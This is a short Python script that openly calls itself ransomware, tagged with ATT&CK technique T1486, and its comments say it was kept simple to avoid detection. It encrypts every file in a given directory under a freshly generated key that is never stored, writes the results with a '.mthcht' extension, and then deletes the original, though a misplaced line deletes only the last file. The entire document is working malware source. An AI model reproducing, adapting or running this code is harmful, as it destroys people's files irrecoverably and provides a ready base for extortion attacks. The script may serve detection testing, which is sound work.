#! /usr/bin/env python3

# This is a simple ransomware script that encrypts all the files in a directory provided as an argument
# T1486 - Data Encrypted for Impact

# Importing necessary modules, keeped it very simple to avoid detection
import os 
import sys 
from cryptography.fernet import Fernet 

# Get the directory to be encrypted as an argument 
if len(sys.argv) > 1:
    directory = sys.argv[1]
else:
	print('Please provide a directory to encrypt.')
	exit()

# Generate a key 
key = Fernet.generate_key() 
f = Fernet(key) 

# Encrypt each file in the directory 
for filename in os.listdir(directory): 
	filepath = os.path.join(directory, filename) 
	with open(filepath, 'rb') as file: 
		# Read and encrypt the file 
		file_data = file.read() 
	encrypted_data = f.encrypt(file_data) 

	# Write the encrypted file 
	with open(filepath + '.mthcht', 'wb') as file: 
		file.write(encrypted_data) 

# Remove the original file 
os.remove(filepath)
